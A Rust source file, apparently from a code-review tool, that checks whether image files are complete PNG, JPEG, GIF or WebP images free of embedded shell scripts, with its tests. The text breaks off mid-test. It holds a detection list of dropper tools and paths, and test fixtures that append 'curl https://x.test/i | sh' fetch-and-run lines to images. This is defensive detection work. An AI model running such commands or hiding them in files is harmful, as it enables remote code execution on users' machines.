//! Whether a file is a whole image and plausibly nothing but one. A review
//! does not read images, and an approved version may gain or change one
//! without a new review, so "an image" must mean more than its first bytes:
//! the file is walked by its format's own structure, must end where the
//! image does, may carry only the kinds and amounts of metadata pictures
//! carry, and must not hold lines a shell would run. A shell asked to run a
//! PNG does run it: it only looks for a NUL in the first line, and a PNG's
//! first line has none. This says nothing about what the pixels are; a
//! file that fails here is simply not passed over, and the source is then
//! reviewed in full. Nor does it rest on the bytes alone: an image is
//! passed over only away from where files are run (see `Surroundings`),
//! and a reviewed line that runs one is reported whatever the image holds
//! (see `review::check_runs`).

use std::collections::HashSet;
use std::fs::File;
use std::io::Read;
use std::ops::Range;
use std::path::Path;

use crate::engine::plan::glob_matches;
use crate::paths::file_name;
use crate::rules;
use crate::sha256::{Digest, Sha256};

/// The extensions of the formats checked here.
const EXTENSIONS: &[&str] = &["png", "jpg", "jpeg", "gif", "webp"];

/// The largest image read to be checked; a larger one is not vouched for.
const MAX_BYTES: u64 = 64 * 1024 * 1024;

/// One text chunk or comment, and all of them together: room for a title,
/// an author and a licence line, not for a script.
const MAX_TEXT: usize = 1024;
const MAX_TEXT_TOTAL: usize = 4 * 1024;
/// All other metadata together (EXIF, application segments), a colour
/// profile, and an XMP packet.
const MAX_METADATA: usize = 64 * 1024;
const MAX_PROFILE: usize = 1024 * 1024;
const MAX_XMP: usize = 16 * 1024;

/// This many text bytes in a row with a line break among them, in a
/// metadata segment, are a text file kept in an image.
const TEXT_BLOCK: usize = 256;
/// A line of only printable characters this long does not come out of
/// compressed pixels by chance.
const LONG_LINE: usize = 24;
/// The shortest printable line looked at: `./x`.
const SHORT_LINE: usize = 3;
/// From this length a printable line is also tested for signs short
/// enough to turn up in compressed data now and then.
const SIGN_LINE: usize = 6;
/// The same two lengths for a line that starts as text and goes on in
/// other bytes. Megabytes of compressed pixels hold thousands of line
/// breaks followed by a few printable bytes, so more of them must agree
/// before the start of such a line counts.
const PARTIAL_LINE: usize = 10;
const PARTIAL_SIGN_LINE: usize = 16;
/// From this length a run of printable bytes anywhere is searched for the
/// words below.
const WORD_RUN: usize = 8;

/// How a line a shell would act on starts.
const LINE_STARTS: &[&[u8]] = &[b"#!", b". ", b"./", b"~/", b"sh ", b"source "];
/// What such a line holds, wherever it is: the programs and paths a
/// dropper uses.
const WORDS: &[&[u8]] = &[
    b"curl", b"wget", b"bash", b"eval", b"exec", b"sudo", b"/bin/", b"/tmp/", b"/dev/", b"base64",
    b"python", b"perl",
];
/// Shell syntax: substitution, chaining, a pipe.
const SYNTAX: &[&[u8]] = &[b"$(", b"${", b"`", b"&&", b"||", b"| ", b"|sh"];

/// Whether `rel` is named as an image of a format `is_whole` knows.
pub(crate) fn is_named(rel: &str) -> bool {
    let name = file_name(rel).to_ascii_lowercase();
    name.rsplit_once('.')
        .is_some_and(|(stem, extension)| !stem.is_empty() && EXTENSIONS.contains(&extension))
}

/// Whether `bytes` are one complete PNG, JPEG, GIF or WebP image, with no
/// more metadata than a picture has, and nothing in them that reads as a
/// script.
pub(crate) fn is_whole(bytes: &[u8]) -> bool {
    png(bytes)
        .or_else(|| jpeg(bytes))
        .or_else(|| gif(bytes))
        .or_else(|| webp(bytes))
        .is_some_and(|extras| !reads_as_script(bytes, &extras.xmp))
}

/// `is_whole` for the file at `path`, which must still hash to `expected`.
pub(crate) fn is_whole_file(path: &Path, expected: &Digest) -> bool {
    let mut bytes = Vec::new();
    File::open(path)
        .and_then(|file| file.take(MAX_BYTES + 1).read_to_end(&mut bytes))
        .is_ok_and(|read| read as u64 <= MAX_BYTES)
        && Sha256::digest(&bytes) == *expected
        && is_whole(&bytes)
}

/// The extensions of files a shell or an interpreter runs.
const SCRIPT_EXTENSIONS: &[&str] = &["sh", "bash", "zsh", "fish", "py", "pl", "rb", "lua", "js"];

/// The directory a path is in; empty at the top of the tree.
fn directory(path: &str) -> &str {
    path.rsplit_once('/').map_or("", |(directory, _)| directory)
}

/// What stands around the images of one tree, for deciding which of them
/// may be passed over. A whole image is passed over because approved text
/// does not run files it was not sent; that is known of a line that names
/// the file it runs (see `review::check_runs`), and not of one that runs
/// whatever is in a directory (`for h in hooks.d/*; do . "$h"; done`,
/// `run-parts hooks.d`). So an image is left alone only away from where
/// files are run: not in a directory that holds a script, and not in one
/// that a reviewed line loops over, globs or hands to something that runs
/// what it finds. A wallpaper among wallpapers stays what it was.
#[derive(Default)]
pub(crate) struct Surroundings {
    /// Directories that hold a file a shell or an interpreter would run.
    script_directories: HashSet<String>,
    /// The directory and the name pattern of each place files are run
    /// from; an empty directory is one that was not written out.
    run_globs: Vec<(String, String)>,
}

impl Surroundings {
    /// Notes the file at `path`: one marked to run, or named as a script,
    /// makes its directory a place scripts are.
    pub(crate) fn note_file(&mut self, path: &str, executable: bool) {
        let name = file_name(path);
        let script = name.rsplit_once('.').is_some_and(|(_, extension)| {
            SCRIPT_EXTENSIONS.contains(&extension.to_ascii_lowercase().as_str())
        });
        if executable || script {
            self.script_directories.insert(directory(path).to_string());
        }
    }

    /// Notes the reviewed text of the file at `path`: a script by its
    /// first line, and the directories and globs its lines run.
    pub(crate) fn note_text(&mut self, path: &str, text: &str) {
        if text.starts_with("#!") {
            self.script_directories.insert(directory(path).to_string());
        }
        for line in text.lines() {
            for word in rules::run_globs(line) {
                let glob = run_glob(&word);
                if self.run_globs.len() < MAX_RUN_GLOBS && !self.run_globs.contains(&glob) {
                    self.run_globs.push(glob);
                } else if self.run_globs.len() >= MAX_RUN_GLOBS {
                    // Too many to keep apart: any directory may be one.
                    self.run_globs = vec![(String::new(), "*".to_string())];
                    return;
                }
            }
        }
    }

    /// Whether an image at `path` is away from where files are run.
    pub(crate) fn leaves_alone(&self, path: &str) -> bool {
        let parent = directory(path);
        let name = file_name(path);
        let under = format!("/{parent}/");
        !self.script_directories.contains(parent)
            && !self.run_globs.iter().any(|(directory, pattern)| {
                glob_matches(pattern, name)
                    // Wherever the line was run from: `hooks.d/*` reaches
                    // `x/hooks.d/` and, for a search, what is below it.
                    && (directory.is_empty() || under.contains(&format!("/{directory}/")))
            })
    }
}

/// The most places kept; a tree with more is one where files run anywhere.
const MAX_RUN_GLOBS: usize = 4096;

/// A directory or glob as written, as the directory it names and the
/// pattern a file name there must match. Parts that are not plain names (a
/// variable, a glob, `..`) and what stands before them are dropped: where
/// they lead is not known, so the rest matches wherever it is found.
fn run_glob(word: &str) -> (String, String) {
    let is_plain = |part: &str| !part.contains(['*', '?', '[', '{', '$', '~', '`']) && part != "..";
    let mut parts: Vec<&str> = word
        .split('/')
        .filter(|part| !part.is_empty() && *part != ".")
        .collect();
    let pattern = match parts.last() {
        Some(last) if !is_plain(last) && !word.ends_with('/') => {
            let last = parts.pop().unwrap_or_default();
            // Only `*` and `?` are matched here; any other pattern is
            // taken to match every name.
            if last.contains(['[', '{', '$', '~', '`']) || last == ".." {
                "*"
            } else {
                last
            }
        }
        _ => "*",
    };
    let from = parts
        .iter()
        .rposition(|part| !is_plain(part))
        .map_or(0, |at| at + 1);
    (parts[from..].join("/"), pattern.to_string())
}

/// What an image carries besides its pixels, added up while it is walked.
#[derive(Default)]
struct Extras {
    text: usize,
    metadata: usize,
    profile: usize,
    /// Where XMP packets are: XML, whose long lines are not held against
    /// the image once the packet itself was checked.
    xmp: Vec<Range<usize>>,
}

impl Extras {
    /// A comment or text chunk of `data`.
    fn add_text(&mut self, data: &[u8]) -> Option<()> {
        self.text += data.len();
        (data.len() <= MAX_TEXT && self.text <= MAX_TEXT_TOTAL && !has_text_block(data))
            .then_some(())
    }

    /// EXIF, an application segment, or any other small metadata.
    fn add_metadata(&mut self, data: &[u8]) -> Option<()> {
        self.metadata += data.len();
        (self.metadata <= MAX_METADATA && !has_text_block(data)).then_some(())
    }

    /// A colour profile, or one part of it.
    fn add_profile(&mut self, data: &[u8]) -> Option<()> {
        self.profile += data.len();
        (self.profile <= MAX_PROFILE && !has_text_block(data)).then_some(())
    }

    /// An XMP packet at `range` of the file.
    fn add_xmp(&mut self, data: &[u8], range: Range<usize>) -> Option<()> {
        self.metadata += data.len();
        let plain = data.len() <= MAX_XMP
            && self.metadata <= MAX_METADATA
            && !lines(data).any(|line| {
                let line = line.trim_ascii_start();
                line.starts_with(b"#!")
                    || WORDS
                        .iter()
                        .chain(SYNTAX)
                        // XMP is full of namespace URLs and of words such
                        // as "properly"; these are told apart elsewhere.
                        .filter(|sign| !matches!(**sign, b"perl" | b"python" | b"exec" | b"base64"))
                        .any(|sign| holds(line, sign))
            });
        self.xmp.push(range);
        plain.then_some(())
    }
}

fn is_text_byte(byte: u8) -> bool {
    matches!(byte, 0x20..=0x7e | b'\t' | b'\n' | b'\r')
}

/// Whether `data` holds `TEXT_BLOCK` text bytes in a row with a line break
/// among them.
fn has_text_block(data: &[u8]) -> bool {
    let mut run = 0;
    let mut breaks = false;
    for byte in data {
        if is_text_byte(*byte) {
            run += 1;
            breaks |= *byte == b'\n';
            if run >= TEXT_BLOCK && breaks {
                return true;
            }
        } else {
            run = 0;
            breaks = false;
        }
    }
    false
}

fn holds(line: &[u8], sign: &[u8]) -> bool {
    line.windows(sign.len()).any(|window| window == sign)
}

/// The lines of `data` as a shell reads them, without a trailing carriage
/// return.
fn lines(data: &[u8]) -> impl Iterator<Item = &[u8]> {
    data.split(|byte| *byte == b'\n')
        .map(|line| line.strip_suffix(b"\r").unwrap_or(line))
}

/// A byte of a command as it is written: printable ASCII, or a tab.
fn is_printable(byte: u8) -> bool {
    matches!(byte, 0x20..=0x7e | b'\t')
}

/// Where a shell starts a comment in `text`: a `#` that begins a word,
/// outside quotes.
fn comment_start(text: &[u8]) -> Option<usize> {
    let mut quote = None;
    let mut escaped = false;
    let mut begins_word = true;
    for (at, byte) in text.iter().enumerate() {
        if escaped {
            escaped = false;
            begins_word = false;
            continue;
        }
        match (quote, *byte) {
            (Some(open), byte) if byte == open => quote = None,
            (None, b'\\') => escaped = true,
            (None, b'\'' | b'"') => quote = Some(*byte),
            (None, b'#') if begins_word => return Some(at),
            (Some(_) | None, _) => {}
        }
        begins_word = quote.is_none() && matches!(byte, b' ' | b'\t' | b';' | b'&' | b'|' | b'(');
    }
    None
}

/// Whether `text` holds `word` as a word of its own: not inside a longer
/// one (`medieval`, `properly`), though a version may follow (`python3`).
fn holds_word(text: &[u8], word: &[u8]) -> bool {
    text.windows(word.len()).enumerate().any(|(at, window)| {
        let before = at.checked_sub(1).and_then(|at| text.get(at));
        let after = text.get(at + word.len());
        window == word
            && !(word.first().is_some_and(u8::is_ascii_alphanumeric)
                && before.is_some_and(u8::is_ascii_alphanumeric))
            && !(word.last().is_some_and(u8::is_ascii_alphanumeric)
                && after.is_some_and(u8::is_ascii_alphabetic))
    })
}

/// Whether `text`, the printable bytes a line starts with, is something a
/// shell would act on. `closed` says the shell reads nothing else on the
/// line; otherwise bytes that are not text follow, which a shell takes as
/// one more word, or does not read at all after a `#`. Compressed pixels
/// hold line breaks too, and now and then a few printable bytes after one,
/// so the fewer bytes a sign has, the more of the line must be text for it
/// to count. A wrong yes costs one full review.
fn is_command_line(text: &[u8], closed: bool) -> bool {
    // What follows a comment sign is not read: the command before it is as
    // good as a whole line (`touch x; curl ... #` and then anything).
    let code = comment_start(text).map_or(text, |at| &text[..at]);
    let commented = code.len() < text.len() && !code.trim_ascii().is_empty();
    let start_line = if closed || commented {
        SHORT_LINE
    } else {
        PARTIAL_LINE
    };
    let sign_line = if closed { SIGN_LINE } else { PARTIAL_SIGN_LINE };
    let command = text.trim_ascii_start();
    // `$(x)` and `` `x` ``, whole: a substitution runs whatever its length.
    let substitution = match command {
        [b'$', b'(', rest @ ..] => rest.contains(&b')'),
        [b'`', rest @ ..] => rest.contains(&b'`'),
        _ => false,
    };
    // One backtick opens nothing a line can close; pixels hold it often.
    let holds_sign = |sign: &[u8]| {
        if sign == b"`" {
            text.iter().filter(|byte| **byte == b'`').nth(1).is_some()
        } else {
            holds(text, sign)
        }
    };
    text.len() >= LONG_LINE
        || WORDS.iter().any(|sign| holds(text, sign))
        || ((closed || commented) && substitution)
        // Text, a comment sign, then bytes that are not text: no picture
        // is made so, and a script hidden in one is.
        || (commented && !closed && code.len() >= PARTIAL_LINE)
        || (text.len() >= start_line && LINE_STARTS.iter().any(|start| command.starts_with(start)))
        || (text.len() >= sign_line
            && (matches!(command.first(), Some(b'/' | b'$'))
                || SYNTAX.iter().any(|sign| holds_sign(sign))))
}

/// Whether the file holds a line a shell would act on. A shell runs a line
/// up to its end whatever bytes are in it: what is not text is part of a
/// word, a `#` hides the rest, and a `;` starts the next command. So each
/// run of printable bytes is judged, not only lines printable throughout:
/// the run a line starts with as a command line, and every run for the
/// programs a dropper names, wherever on its line it is and on the first
/// line too. A carriage return ends a line here as a line feed does; no
/// shell reads it so, hence such a line is held to the longer lengths. XMP
/// packets (`xmp`) were checked on their own terms.
fn reads_as_script(bytes: &[u8], xmp: &[Range<usize>]) -> bool {
    let is_break = |byte: Option<&u8>| matches!(byte, Some(b'\n' | b'\r'));
    let mut at = 0;
    while at < bytes.len() {
        let start = at;
        while bytes.get(at).copied().is_some_and(is_printable) {
            at += 1;
        }
        if at == start {
            at += 1;
            continue;
        }
        if xmp
            .iter()
            .any(|packet| packet.start <= start && at <= packet.end)
        {
            continue;
        }
        let text = &bytes[start..at];
        let before = start.checked_sub(1).and_then(|before| bytes.get(before));
        let after = bytes.get(at);
        // A carriage return that is not half of a CR LF pair.
        let lone_return =
            before == Some(&b'\r') || (after == Some(&b'\r') && bytes.get(at + 1) != Some(&b'\n'));
        let ends_line = after.is_none() || is_break(after);
        if (is_break(before) && is_command_line(text, ends_line && !lone_return))
            || (text.len() >= WORD_RUN && WORDS.iter().any(|word| holds_word(text, word)))
        {
            return true;
        }
    }
    false
}

fn be32(bytes: &[u8], at: usize) -> Option<usize> {
    let field: [u8; 4] = bytes.get(at..at.checked_add(4)?)?.try_into().ok()?;
    usize::try_from(u32::from_be_bytes(field)).ok()
}

/// The CRC-32 of each byte value, for `crc32`.
const CRC_TABLE: [u32; 256] = {
    let mut table = [0_u32; 256];
    let mut index = 0;
    let mut value = 0_u32;
    while index < table.len() {
        let mut crc = value;
        let mut bit = 0;
        while bit < 8 {
            crc = (crc >> 1) ^ (0xedb8_8320 & 0_u32.wrapping_sub(crc & 1));
            bit += 1;
        }
        table[index] = crc;
        index += 1;
        value += 1;
    }
    table
};

fn crc32(bytes: &[u8]) -> u32 {
    !bytes.iter().fold(u32::MAX, |crc, byte| {
        (crc >> 8) ^ CRC_TABLE[usize::from(crc.to_le_bytes()[0] ^ byte)]
    })
}

/// Chunks with valid checksums from `IHDR` to an `IEND` that ends the
/// file, each of a kind the PNG and APNG specifications define. A private
/// chunk may hold anything, so it is not a picture's.
fn png(bytes: &[u8]) -> Option<Extras> {
    let mut rest = bytes.strip_prefix(b"\x89PNG\r\n\x1a\n")?;
    let mut extras = Extras::default();
    let mut first = true;
    let mut data = false;
    loop {
        let length = be32(rest, 0)?;
        let end = length.checked_add(8)?;
        let (body, stored) = (rest.get(4..end)?, be32(rest, end)?);
        let (kind, content) = body.split_at(4);
        if u32::try_from(stored) != Ok(crc32(body)) || first != (kind == b"IHDR") {
            return None;
        }
        first = false;
        rest = &rest[end + 4..];
        match kind {
            b"IEND" => return (data && length == 0 && rest.is_empty()).then_some(extras),
            b"IDAT" => data = true,
            // An animation's frames: pixels like IDAT.
            b"IHDR" | b"fdAT" => {}
            b"tEXt" | b"zTXt" | b"iTXt" => extras.add_text(content)?,
            b"iCCP" => extras.add_profile(content)?,
            b"PLTE" | b"tRNS" | b"cHRM" | b"gAMA" | b"sBIT" | b"sRGB" | b"bKGD" | b"hIST"
            | b"pHYs" | b"sPLT" | b"tIME" | b"cICP" | b"eXIf" | b"acTL" | b"fcTL" => {
                extras.add_metadata(content)?;
            }
            _ => return None,
        }
    }
}

/// What an APP1 segment holding XMP starts with.
const JPEG_XMP: &[u8] = b"http://ns.adobe.com/xap/1.0/\0";
/// What an APP2 segment holding part of a colour profile starts with.
const JPEG_PROFILE: &[u8] = b"ICC_PROFILE\0";

/// Marker segments from start-of-image to an end-of-image that ends the
/// file, with the compressed data of each scan stepped over. A scan must
/// come after a frame header, as in any image a decoder accepts, and only
/// the segments a JPEG is made of may appear.
fn jpeg(bytes: &[u8]) -> Option<Extras> {
    let mut rest = bytes.strip_prefix(b"\xff\xd8")?;
    let mut extras = Extras::default();
    let mut frame = false;
    let mut scans = false;
    loop {
        let [0xff, marker, after @ ..] = rest else {
            return None;
        };
        match *marker {
            0xd9 => return (scans && after.is_empty()).then_some(extras),
            // Fill bytes before a marker.
            0xff => rest = &rest[1..],
            marker => {
                let [high, low, ..] = after else {
                    return None;
                };
                let length = usize::from(u16::from_be_bytes([*high, *low]));
                let content = after.get(2..length)?;
                let at = bytes.len() - after.len() + 2;
                rest = &after[length..];
                match marker {
                    // Application segments and comments.
                    0xe1 if content.starts_with(JPEG_XMP) => {
                        let packet = &content[JPEG_XMP.len()..];
                        extras.add_xmp(packet, at + JPEG_XMP.len()..at + content.len())?;
                    }
                    0xe2 if content.starts_with(JPEG_PROFILE) => extras.add_profile(content)?,
                    0xe0..=0xef => extras.add_metadata(content)?,
                    0xfe => extras.add_text(content)?,
                    // Frame headers, which share their range with the
                    // Huffman and arithmetic tables and one reserved code.
                    0xc0..=0xc7 | 0xc9..=0xcf => {
                        frame |= !matches!(marker, 0xc4 | 0xcc);
                    }
                    // Quantization tables, a line count, a restart interval.
                    0xdb..=0xdd => {}
                    0xda => {
                        if !frame {
                            return None;
                        }
                        scans = true;
                        // The scan runs to the next marker that is not a
                        // stuffed zero or a restart.
                        let mut at = 0;
                        while let Some(pair) = rest.get(at..at + 2) {
                            if pair[0] == 0xff && !matches!(pair[1], 0x00 | 0xd0..=0xd7) {
                                break;
                            }
                            at += 1;
                        }
                        rest = &rest[at.min(rest.len())..];
                    }
                    _ => return None,
                }
            }
        }
    }
}

/// Steps over a run of length-prefixed sub-blocks to its empty terminator.
fn gif_blocks(mut rest: &[u8]) -> Option<&[u8]> {
    loop {
        let (size, after) = rest.split_first()?;
        if *size == 0 {
            return Some(after);
        }
        rest = after.get(usize::from(*size)..)?;
    }
}

/// A colour table follows when the packed byte's top bit is set.
fn gif_table(rest: &[u8], packed: u8) -> Option<&[u8]> {
    let entries = if packed & 0x80 == 0 {
        0
    } else {
        3 * (2_usize << (packed & 7))
    };
    rest.get(entries..)
}

/// The most bytes of a graphic control or a looping extension.
const GIF_CONTROL: usize = 32;

/// Blocks from the header to a trailer that ends the file. Of the
/// extensions, only the ones an image or an animation uses: a graphic
/// control, a comment or plain text, the looping extension, an XMP packet
/// and a colour profile.
fn gif(bytes: &[u8]) -> Option<Extras> {
    if !(bytes.starts_with(b"GIF87a") || bytes.starts_with(b"GIF89a")) {
        return None;
    }
    let mut extras = Extras::default();
    let mut images = false;
    let mut rest = gif_table(bytes.get(13..)?, *bytes.get(10)?)?;
    loop {
        rest = match rest {
            [0x3b] => return images.then_some(extras),
            [0x21, label, blocks @ ..] => {
                let after = gif_blocks(blocks)?;
                let content = &blocks[..blocks.len() - after.len()];
                let at = bytes.len() - blocks.len();
                match *label {
                    0xf9 if content.len() <= GIF_CONTROL => {}
                    0x01 | 0xfe => extras.add_text(content)?,
                    // The first sub-block names the application.
                    0xff => match content.get(..12)? {
                        b"\x0bNETSCAPE2.0" | b"\x0bANIMEXTS1.0" if content.len() <= GIF_CONTROL => {
                        }
                        b"\x0bXMP DataXMP" => {
                            extras.add_xmp(&content[12..], at + 12..at + content.len())?;
                        }
                        b"\x0bICCRGBG1012" => extras.add_profile(content)?,
                        _ => return None,
                    },
                    _ => return None,
                }
                after
            }
            [0x2c, descriptor @ ..] => {
                images = true;
                let data = gif_table(descriptor.get(9..)?, *descriptor.get(8)?)?;
                // The minimum code size, then the image data.
                gif_blocks(data.get(1..)?)?
            }
            _ => return None,
        };
    }
}

/// A RIFF container of exactly the file's size, holding chunks that fill
/// it, the first of them one a WebP image starts with and all of them
/// kinds the format defines.
fn webp(bytes: &[u8]) -> Option<Extras> {
    let size = |at: usize| -> Option<usize> {
        let field: [u8; 4] = bytes.get(at..at.checked_add(4)?)?.try_into().ok()?;
        usize::try_from(u32::from_le_bytes(field)).ok()
    };
    if !bytes.starts_with(b"RIFF")
        || bytes.get(8..12) != Some(b"WEBP")
        || !matches!(bytes.get(12..16), Some(b"VP8 " | b"VP8L" | b"VP8X"))
        || size(4).and_then(|size| size.checked_add(8)) != Some(bytes.len())
    {
        return None;
    }
    let mut extras = Extras::default();
    let mut at = 12;
    while at < bytes.len() {
        let length = size(at + 4)?;
        let content = bytes.get(at + 8..(at + 8).checked_add(length)?)?;
        match bytes.get(at..at + 4)? {
            // Pixels, and an animation's frames.
            b"VP8 " | b"VP8L" | b"ALPH" | b"ANMF" => {}
            b"VP8X" | b"ANIM" | b"EXIF" => extras.add_metadata(content)?,
            b"ICCP" => extras.add_profile(content)?,
            b"XMP " => extras.add_xmp(content, at + 8..at + 8 + length)?,
            _ => return None,
        }
        // Chunk data is padded to an even length.
        at = (at + 8 + length).checked_add(length & 1)?;
    }
    (at == bytes.len()).then_some(extras)
}

#[cfg(test)]
mod tests {
    use std::fs;

    use super::{Surroundings, crc32, is_named, is_whole, is_whole_file};
    use crate::sha256::Sha256;
    use crate::test_support::TempDir;

    fn chunk(kind: [u8; 4], data: &[u8]) -> Vec<u8> {
        let mut body = kind.to_vec();
        body.extend_from_slice(data);
        let mut chunk = u32::try_from(data.len()).unwrap().to_be_bytes().to_vec();
        chunk.extend_from_slice(&body);
        chunk.extend_from_slice(&crc32(&body).to_be_bytes());
        chunk
    }

    const PIXELS: &[u8] = &[0x78, 0x01, 0x63, 0x60, 0, 0, 0, 2, 0, 1];

    /// A PNG with `extra` chunks between its header and its pixels.
    fn png_with(extra: &[Vec<u8>]) -> Vec<u8> {
        let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
        png.extend(chunk(*b"IHDR", &[0, 0, 0, 1, 0, 0, 0, 1, 8, 0, 0, 0, 0]));
        for chunk in extra {
            png.extend(chunk);
        }
        png.extend(chunk(*b"IDAT", PIXELS));
        png.extend(chunk(*b"IEND", &[]));
        png
    }

    fn png() -> Vec<u8> {
        png_with(&[])
    }

    /// One JPEG segment: a marker, and its length before its content.
    fn segment(marker: u8, content: &[u8]) -> Vec<u8> {
        let mut segment = vec![0xff, marker];
        segment.extend(u16::try_from(content.len() + 2).unwrap().to_be_bytes());
        segment.extend_from_slice(content);
        segment
    }

    /// A JPEG with `extra` segments after its first.
    fn jpeg_with(extra: &[Vec<u8>]) -> Vec<u8> {
        let mut jpeg = b"\xff\xd8\xff\xe0\x00\x04JF".to_vec();
        for segment in extra {
            jpeg.extend(segment);
        }
        jpeg.extend(b"\xff\xdb\x00\x03\x00");
        // A progressive frame, a fill byte, then two scans with a table
        // between them, a stuffed zero and a restart marker in their data.
        jpeg.extend(b"\xff\xc2\x00\x03\x08\xff\xff\xda\x00\x03\x01\x12\xff\x00\x34");
        jpeg.extend(b"\xff\xc4\x00\x02\xff\xda\x00\x02\xff\xd0\x56\xff\xd9");
        jpeg
    }

    fn jpeg() -> Vec<u8> {
        jpeg_with(&[])
    }

    /// A GIF with `extra` extension blocks before its image.
    fn gif_with(extra: &[&[u8]]) -> Vec<u8> {
        let mut gif = b"GIF89a\x01\x00\x01\x00\x80\x00\x00".to_vec();
        gif.extend([0, 0, 0, 255, 255, 255]);
        gif.extend(b"\x21\xfe\x02hi\x00");
        for block in extra {
            gif.extend(*block);
        }
        gif.extend(b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b");
        gif
    }

    fn gif() -> Vec<u8> {
        gif_with(&[])
    }

    /// A WebP of an extended header and `chunks`, each a name and content.
    fn webp_with(chunks: &[(&[u8; 4], &[u8])]) -> Vec<u8> {
        let mut body = b"WEBPVP8X\x05\x00\x00\x00abcde\x00".to_vec();
        for (name, content) in chunks {
            body.extend(*name);
            body.extend(u32::try_from(content.len()).unwrap().to_le_bytes());
            body.extend(*content);
            if content.len() % 2 == 1 {
                body.push(0);
            }
        }
        let mut webp = b"RIFF".to_vec();
        webp.extend(u32::try_from(body.len()).unwrap().to_le_bytes());
        webp.extend(body);
        webp
    }

    fn webp() -> Vec<u8> {
        // An extended image: an odd-sized chunk with its pad byte, then
        // another chunk.
        webp_with(&[(b"EXIF", b"ab")])
    }

    /// Lines of text no picture carries: `count` of them.
    fn prose(count: usize) -> Vec<u8> {
        "one more line of text\n".repeat(count).into_bytes()
    }

    #[test]
    fn the_checksum_is_the_one_png_uses() {
        assert_eq!(crc32(b"123456789"), 0xcbf4_3926);
        assert_eq!(crc32(b"IEND"), 0xae42_6082);
    }

    #[test]
    fn whole_images_of_each_format_are_recognised() {
        assert_eq!(
            webp(),
            b"RIFF\x1c\x00\x00\x00WEBPVP8X\x05\x00\x00\x00abcde\x00EXIF\x02\x00\x00\x00ab"
        );
        for (name, image) in [
            ("png", png()),
            ("jpeg", jpeg()),
            ("gif", gif()),
            ("webp", webp()),
        ] {
            assert!(is_whole(&image), "{name}");
        }
    }

    #[test]
    fn a_file_that_only_starts_like_an_image_is_not_one() {
        // The first bytes of each format, then a line a shell would run.
        for start in [
            &b"\x89PNG\r\n\x1a\n"[..],
            b"\xff\xd8\xff",
            b"GIF89a=1",
            b"RIFF\x00\x00\x00\x00WEBP",
        ] {
            let mut file = start.to_vec();
            file.extend(b"\ncurl https://x.test/i | sh\n\0");
            assert!(!is_whole(&file), "{start:?}");
        }
        assert!(!is_whole(b""));
    }

    #[test]
    fn nothing_may_follow_or_be_cut_from_an_image() {
        for (name, image) in [
            ("png", png()),
            ("jpeg", jpeg()),
            ("gif", gif()),
            ("webp", webp()),
        ] {
            let mut longer = image.clone();
            longer.extend(b"\ncurl https://x.test/i | sh\n");
            assert!(!is_whole(&longer), "{name} with a tail");
            for cut in 0..image.len() {
                assert!(!is_whole(&image[..cut]), "{name} cut at {cut}");
            }
        }
    }

    #[test]
    fn a_container_without_an_image_in_it_is_refused() {
        // A scan with no frame header before it, whatever its data.
        assert!(!is_whole(b"\xff\xd8\xff\xda\x00\x02curl x | sh\xff\xd9"));
        // A RIFF file whose only chunk is not an image.
        assert!(!is_whole(
            b"RIFF\x10\x00\x00\x00WEBPJUNK\x04\x00\x00\x00abcd"
        ));
        assert!(!is_whole(b"RIFF\x04\x00\x00\x00WEBP"));
        // An animated GIF with a local colour table is still one image file.
        let mut animated = b"GIF89a\x01\x00\x01\x00\x00\x00\x00".to_vec();
        animated.extend(b"\x21\xff\x0bNETSCAPE2.0\x03\x01\x00\x00\x00");
        for _ in 0..2 {
            animated.extend(b"\x21\xf9\x04\x00\x0a\x00\x00\x00");
            animated.extend(b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x80");
            animated.extend([0, 0, 0, 255, 255, 255]);
            animated.extend(b"\x02\x02\x44\x01\x00");
        }
        animated.push(0x3b);
        assert!(is_whole(&animated));
    }

    #[test]
    fn a_png_with_a_bad_checksum_or_no_image_data_is_refused() {
        let mut bad = png();
        let at = bad.len() - 20;
        bad[at] ^= 1;
        assert!(!is_whole(&bad));

        let mut empty = b"\x89PNG\r\n\x1a\n".to_vec();
        empty.extend(chunk(*b"IHDR", &[0; 13]));
        empty.extend(chunk(*b"IEND", &[]));
        assert!(!is_whole(&empty));
    }

    #[test]
    fn a_png_carries_only_the_chunks_and_text_a_picture_has() {
        // What an editor writes: a palette, a resolution, a short note.
        let ordinary = png_with(&[
            chunk(*b"PLTE", &[0, 0, 0, 255, 255, 255]),
            chunk(*b"pHYs", &[0, 0, 11, 19, 0, 0, 11, 19, 1]),
            chunk(*b"tEXt", b"Software\0GIMP 3.0"),
            chunk(*b"tIME", &[7, 234, 10, 4, 12, 0, 0]),
        ]);
        assert!(is_whole(&ordinary));
        // An animation's chunks are pixels too.
        assert!(is_whole(&png_with(&[
            chunk(*b"acTL", &[0, 0, 0, 1, 0, 0, 0, 0]),
            chunk(*b"fdAT", &[0, 0, 0, 1, 0x78, 0x01]),
        ])));

        // A chunk of a kind no specification names may hold anything.
        assert!(!is_whole(&png_with(&[chunk(*b"puNk", &[1, 2, 3])])));
        assert!(!is_whole(&png_with(&[chunk(*b"prVt", b"x")])));
        // A text chunk past a note's size, or many small ones.
        assert!(!is_whole(&png_with(&[chunk(*b"tEXt", &[b'a'; 1025])])));
        assert!(is_whole(&png_with(&[chunk(*b"zTXt", &[0x80; 1024])])));
        let notes: Vec<Vec<u8>> = (0..5).map(|_| chunk(*b"iTXt", &[0x80; 1000])).collect();
        assert!(!is_whole(&png_with(&notes)));
        // Metadata and a profile are bounded as well.
        assert!(is_whole(&png_with(&[chunk(*b"eXIf", &vec![0x80; 60_000])])));
        assert!(!is_whole(&png_with(&[chunk(
            *b"eXIf",
            &vec![0x80; 70_000]
        )])));
        assert!(!is_whole(&png_with(&[chunk(
            *b"iCCP",
            &vec![0x80; 1024 * 1024 + 1]
        )])));
        // The header is first, and only first.
        let mut second_header = png();
        let header = chunk(*b"IHDR", &[0, 0, 0, 1, 0, 0, 0, 1, 8, 0, 0, 0, 0]);
        second_header.splice(33..33, header);
        assert!(!is_whole(&second_header));
    }

    #[test]
    fn text_kept_in_metadata_makes_a_file_no_plain_image() {
        // 286 bytes of lines: more than a picture's metadata reads as.
        let text = prose(13);
        assert!(text.len() >= 256);
        for (name, image) in [
            ("png exif", png_with(&[chunk(*b"eXIf", &text)])),
            ("png profile", png_with(&[chunk(*b"iCCP", &text)])),
            ("jpeg app", jpeg_with(&[segment(0xe5, &text)])),
            ("jpeg comment", jpeg_with(&[segment(0xfe, &text)])),
